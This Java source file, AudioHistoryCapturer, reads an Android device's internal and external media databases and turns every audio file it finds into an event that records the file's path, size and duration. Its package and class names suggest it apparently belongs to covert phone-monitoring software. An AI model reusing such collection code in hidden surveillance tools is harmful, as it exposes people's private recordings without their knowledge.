package com.vvt.daemon.mediahistory;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.provider.BaseColumns;
import android.provider.MediaStore.MediaColumns;
import android.provider.MediaStore.Audio.AudioColumns;

import com.vvt.base.FxEvent;
import com.vvt.capture.audio.FxAudioHelper;
import com.vvt.events.FxAudioFileThumnailEvent;
import com.vvt.events.FxMediaType;
import com.vvt.events.FxMimeTypeParser;
import com.vvt.logger.FxLog;
import com.vvt.stringutil.FxStringUtils;

public class AudioHistoryCapturer {
	
	private static final String TAG = "AudioHistoryCapturer";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	public AudioHistoryCapturer() {
	}
	
	public List<FxEvent> getAudioHistory() {
		List<FxEvent> events = new ArrayList<FxEvent>();
		events.addAll(processInternal());
		events.addAll(processExternal());
		return events;
	}
	
	private List<FxEvent> processInternal() {
		if(LOGV) FxLog.v(TAG , "processInternal # ENTER ... ");
		List<FxEvent> events = new ArrayList<FxEvent>();
		
		try {
			final String internalDatabaseFilePath = FxAudioHelper.getInternalDatabaseFilePath();
			if(!FxStringUtils.isEmptyOrNull(internalDatabaseFilePath)) {
				if(LOGD) FxLog.d(TAG , "processInternal # get in internal ...");
				events = getNewerMediaById(internalDatabaseFilePath);
			}
		}
		catch (Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
		}
		if(LOGV) FxLog.v(TAG , "processInternal # EXIT ... ");
		return events;
	}

	private List<FxEvent> processExternal() {
		if(LOGV) FxLog.v(TAG , "processExternal # ENTER ... ");
		List<FxEvent> events = new ArrayList<FxEvent>();
		
		try {
			final String externalDatabaseFilePath = FxAudioHelper.getExternalDatabaseFilePath();
			if(!FxStringUtils.isEmptyOrNull(externalDatabaseFilePath)) {
				if(LOGD) FxLog.d(TAG , "processExternal # get in external ...");
				events = getNewerMediaById(externalDatabaseFilePath);
			}
		}
		catch (Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
		}
		if(LOGV) FxLog.v(TAG , "processExternal # EXIT ... ");
		return events;
	}
	
	 private List<FxEvent> getNewerMediaById(String dbFile) {
		 if(LOGV) FxLog.v(TAG , "getNewerMediaById # ENTER ... ");
		 if(LOGV) FxLog.v(TAG, "getNewerMediaById # dbFile:" + dbFile);
		 List<FxEvent> medias = new ArrayList<FxEvent>();
		 
		 SQLiteDatabase db =  FxAudioHelper.getReadableDatabase(dbFile);
			Cursor cursor = null;
			
			try {
				cursor = db.query(FxAudioHelper.AUDIO_TABLE_NAME, null, null, null, null, null, null);
				
				if (cursor == null) {
					return null;
				}

				FxAudioFileThumnailEvent media = null;

				while (cursor.moveToNext()) {
					int orginRowId = cursor.getInt(cursor.getColumnIndexOrThrow(BaseColumns._ID));
					String fileName = cursor.getString(cursor.getColumnIndexOrThrow(MediaColumns.DATA));
					String mimeType = cursor.getString(cursor.getColumnIndexOrThrow(MediaColumns.MIME_TYPE));
					FxMediaType format = FxMimeTypeParser.parse(mimeType);
					long eventTime = new Date().getTime();
					int actualFileSize = cursor.getInt(cursor.getColumnIndexOrThrow(MediaColumns.SIZE));
					int actualDuration = cursor.getInt(cursor.getColumnIndexOrThrow(AudioColumns.DURATION));
					byte[] data = null;

					File f = new File(fileName); 
					if (!f.exists()) {
						continue;
					}

					media = new FxAudioFileThumnailEvent();
					media.setEventId(orginRowId);
					media.setEventTime(eventTime);
					media.setFormat(format);
					media.setParingId(orginRowId);
					media.setActualDuration(actualDuration);
					media.setAudioData(data);
					media.setActualFileSize(actualFileSize);
					media.setActualFullPath(fileName);
					
					if(media != null)
						medias.add(media);
				}

			}
			finally {
				if(cursor != null)
					cursor.close();
				
				if(db != null)
					db.close();
			}
				if(LOGD) FxLog.d(TAG , "getNewerMediaById # medias size : " +medias.size());  
				if(LOGD) FxLog.d(TAG , "getNewerMediaById # medias :  "+medias.toString());
			if(LOGV) FxLog.v(TAG , "getNewerMediaById # EXIT ... ");
			return medias;
	 }
}
